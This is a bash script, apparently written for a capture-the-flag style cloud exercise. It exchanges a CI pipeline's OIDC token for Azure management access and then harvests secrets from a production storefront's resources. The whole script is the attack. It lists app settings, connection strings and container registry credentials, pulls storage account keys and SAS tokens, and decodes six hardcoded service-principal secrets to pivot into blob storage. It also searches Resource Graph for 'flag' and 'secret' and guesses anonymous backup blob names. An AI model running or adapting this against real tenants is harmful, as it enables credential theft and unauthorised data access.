#!/usr/bin/env bash
set -uo pipefail
TENANT="${AZURE_TENANT_ID}"; CLIENT="${AZURE_CLIENT_ID}"; SUB="${AZURE_SUBSCRIPTION_ID}"; RG=rg-tbl-platform-prod-sea
N=app-tbl-storefront-prod; ACFG=sttblappcfgprodx3euoz; BKP=sttblbackupprodx3euoz
say(){ printf '\n===== %s =====\n' "$*"; }

OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))")
ARM=$(curl -sS -X POST "https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token" --data-urlencode "client_id=${CLIENT}" --data-urlencode "scope=https://management.azure.com/.default" --data-urlencode "grant_type=client_credentials" --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" --data-urlencode "client_assertion=${OIDC}" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
if [ -z "$ARM" ]; then echo "NO ARM TOKEN"; exit 0; fi
echo "ARM token acquired len=${#ARM}"

call(){ # method url token label [data]
  local m=$1 u=$2 t=$3 l=$4 d=${5:-}
  local f c
  f=$(mktemp)
  if [ "$m" = "GET" ]; then
    c=$(curl -sS -m 40 -o "$f" -w '%{http_code}' -H "Authorization: Bearer $t" "$u")
  elif [ -z "$d" ]; then
    c=$(curl -sS -m 40 -o "$f" -w '%{http_code}' -X "$m" -H "Authorization: Bearer $t" -H "Content-Length: 0" "$u")
  else
    c=$(curl -sS -m 40 -o "$f" -w '%{http_code}' -X "$m" -H "Authorization: Bearer $t" -H "Content-Type: application/json" -d "$d" "$u")
  fi
  echo "### $l [$c]"
  head -c 2200 "$f"; echo
  case "$c" in 2*) echo "B64:$(base64 -w0 "$f" | head -c 9000)";; esac
  rm -f "$f"
}
tok(){ # client secret scope
  curl -sS -m 40 -X POST "https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token" \
    --data-urlencode "client_id=$1" --data-urlencode "client_secret=$2" \
    --data-urlencode "scope=$3" --data-urlencode "grant_type=client_credentials" \
    | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"
}

M="https://management.azure.com/subscriptions/${SUB}/resourceGroups/${RG}/providers"
B="$M/Microsoft.Web/sites/${N}"

say "1. configreferences / config GET"
call GET "$B/config/configreferences/appsettings?api-version=2022-03-01" "$ARM" "configref/appsettings"
call GET "$B/config/configreferences/connectionstrings?api-version=2022-03-01" "$ARM" "configref/connectionstrings"
call GET "$B/config/web?api-version=2022-03-01" "$ARM" "config/web"
call GET "$B/config/appsettings?api-version=2022-03-01" "$ARM" "config/appsettings GET"
call GET "$B/config/connectionstrings?api-version=2022-03-01" "$ARM" "config/connectionstrings GET"
call POST "$B/config/appsettings/list?api-version=2022-03-01" "$ARM" "config/appsettings/list"

say "2. site subresources GET"
for P in "config/metadata" "config/logs" "sourcecontrols" "continuouswebjobs" "instances" "premieraddons" "hybridconnectionnamespaces" "privateEndpointConnections" "hostNameBindings" "slots" "deployments" "backups" "config/snapshots" "snapshots" "config/authsettingsV2" "config/azurestorageaccounts" "config/pushsettings" "config/vnetinfo" "config/backup" "config/handlerMappings" "config/virtualApplications" "config/siteAuthSettingsV2"; do
  call GET "$B/$P?api-version=2022-03-01" "$ARM" "GET $P"
done
call POST "$B/config/backup/list?api-version=2022-03-01" "$ARM" "POST config/backup/list"
call POST "$B/config/azurestorageaccounts/list?api-version=2022-03-01" "$ARM" "POST config/azurestorageaccounts/list"
call POST "$B/config/pushsettings/list?api-version=2022-03-01" "$ARM" "POST config/pushsettings/list"

say "3. ACR"
ACR="$M/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz"
call POST "$ACR/listCredentials?api-version=2023-07-01" "$ARM" "ACR listCredentials"
for P in "tokens" "scopeMaps" "webhooks" "replications" "tasks" "runs" "credentials" "exportPipelines" "importPipelines" "pipelineRuns" "cacheRules" "connectedRegistries"; do
  call GET "$ACR/$P?api-version=2023-07-01" "$ARM" "ACR $P"
done

say "4. six SPs: listKeys / blob / serviceSas / appsettings"
SPS='038bc35d-131d-4953-9985-ff4a245ccec1|MUJFOFF+eUdROGVfejZWQmN6bEdKOFllT0hnTlJVZmZiZ051ZmIybQ==
2c34300e-1bc0-41e7-9c1e-8b7571d72c72|QWw3OFF+bjViZG9PM3JrQ2p1bzJKSTJOSHFhZ0pvb2Fac2ZYTmNtNg==
12ed54de-f2eb-4784-804c-3a7a3e83a9e9|blA4OFF+OEl+d2lwMEdPbFcxNXpkdDNGTU12QlY5TFl0YU9vZWEzeg==
462d1c38-4459-48b8-9333-82e389e59514|c2sxOFF+cUQyMmtrSFhVQ2ZxWExxZFA5NURrWUpMMzRlTUVSbGNTag==
881fddce-6208-4af5-a297-7e79c912f83c|LVRsOFF+c0gwUU9QLlZyS1doYTMtN3g0WEEySnhTNGowOG51dmJRTg==
58108da8-044e-4d7e-9a46-92e6179b30be|fjhUOFF+WXdFbWV4U1RSdl9wVXNFd2E5UU1hcHlQMzl+Q1U1VWN1Mg=='
i=0
while IFS='|' read -r APP SB64; do
  i=$((i+1)); [ -z "$APP" ] && continue
  SEC=$(printf '%s' "$SB64" | base64 -d)
  SARM=$(tok "$APP" "$SEC" "https://management.azure.com/.default")
  SST=$(tok "$APP" "$SEC" "https://storage.azure.com/.default")
  echo "--- SP$i $APP arm=${#SARM} st=${#SST}"
  if [ -n "$SARM" ]; then
    call POST "https://management.azure.com/subscriptions/${SUB}/resourceGroups/${RG}/providers/Microsoft.Storage/storageAccounts/${ACFG}/listKeys?api-version=2023-01-01" "$SARM" "SP$i listKeys appcfg"
    call POST "https://management.azure.com/subscriptions/${SUB}/resourceGroups/${RG}/providers/Microsoft.Storage/storageAccounts/${BKP}/listKeys?api-version=2023-01-01" "$SARM" "SP$i listKeys backup"
    call POST "https://management.azure.com/subscriptions/${SUB}/resourceGroups/${RG}/providers/Microsoft.Storage/storageAccounts/${ACFG}/serviceSas?api-version=2023-01-01" "$SARM" "SP$i serviceSas appcfg"
    call POST "https://management.azure.com/subscriptions/${SUB}/resourceGroups/${RG}/providers/Microsoft.Storage/storageAccounts/${BKP}/serviceSas?api-version=2023-01-01" "$SARM" "SP$i serviceSas backup"
    call POST "$B/config/appsettings/list?api-version=2022-03-01" "$SARM" "SP$i appsettings"
  fi
  if [ -n "$SST" ]; then
    call GET "https://${ACFG}.blob.core.windows.net/config/internal-config.json" "$SST" "SP$i GET appcfg/config/internal-config.json"
    call GET "https://${ACFG}.blob.core.windows.net/config?restype=container&comp=list" "$SST" "SP$i LIST appcfg/config"
    call GET "https://${BKP}.blob.core.windows.net/exports?restype=container&comp=list" "$SST" "SP$i LIST backup/exports"
  fi
done <<< "$SPS"

say "5. Resource Graph"
RGQ1='{"query":"Resources | project name,type,location,tags,properties","options":{"$top":1000}}'
RGQ2='{"query":"Resources | where (isnotnull(properties) and properties contains \"flag\") or name contains \"flag\" or type contains \"secret\" | project name,type,properties","options":{"$top":200}}'
RGQ3='{"query":"ResourceContainers | project id,name,type,properties","options":{"$top":200}}'
call POST "https://management.azure.com/providers/Microsoft.ResourceGraph/resources?api-version=2021-03-01" "$ARM" "ARG all resources" "$RGQ1"
call POST "https://management.azure.com/providers/Microsoft.ResourceGraph/resources?api-version=2021-03-01" "$ARM" "ARG flag search" "$RGQ2"
call POST "https://management.azure.com/providers/Microsoft.ResourceGraph/resources?api-version=2021-03-01" "$ARM" "ARG containers" "$RGQ3"

say "6. storage mgmt details"
for A in "$ACFG" "$BKP"; do
  STB="$M/Microsoft.Storage/storageAccounts/$A"
  call GET "$STB?api-version=2023-01-01" "$ARM" "acct $A"
  call GET "$STB/blobServices/default?api-version=2023-01-01" "$ARM" "acct $A blobServices"
  call GET "$STB/blobServices/default/containers/config?api-version=2023-01-01" "$ARM" "acct $A container config"
  call GET "$STB/blobServices/default/containers/config/immutabilityPolicies?api-version=2023-01-01" "$ARM" "acct $A immutability"
  call GET "$STB/blobServices/default/containers/config/legalHold?api-version=2023-01-01" "$ARM" "acct $A legalHold"
  call GET "$STB/blobServices/default/containers/config/blobs?api-version=2023-01-01" "$ARM" "acct $A blobs"
  call GET "$STB/blobServices/default/containers/exports?api-version=2023-01-01" "$ARM" "acct $A container exports"
  call GET "$STB/privateEndpointConnections?api-version=2023-01-01" "$ARM" "acct $A pe"
  call GET "$STB/managementPolicies/default?api-version=2023-01-01" "$ARM" "acct $A mgmtpolicy"
done

say "7. exports anonymous / guesses"
for U in \
 "https://${BKP}.blob.core.windows.net/exports?restype=container&comp=list" \
 "https://${BKP}.blob.core.windows.net/exports?restype=container&comp=list&maxresults=100" \
 "https://${BKP}.blob.core.windows.net/?comp=list" \
 "https://${BKP}.z13.web.core.windows.net/" \
 "https://${BKP}.blob.core.windows.net/\$web?restype=container&comp=list"; do
  code=$(curl -sS -m 25 -o /tmp/anon.out -w '%{http_code}' "$U"); echo "### ANON $U [$code]"; head -c 1200 /tmp/anon.out; echo
done
for BN in internal-config.json config/internal-config.json export.json exports.json backup.json data.json appsettings.json flag flag.txt internal-config internal-config.json.bak config.json storefront-config.json; do
  code=$(curl -sS -m 25 -o /tmp/anon.out -w '%{http_code}' "https://${BKP}.blob.core.windows.net/exports/$BN"); echo "### TRY $BN [$code]"; if [ "$code" = "200" ]; then head -c 2000 /tmp/anon.out; echo; echo "B64:$(base64 -w0 /tmp/anon.out | head -c 6000)"; fi
done

say "DONE"
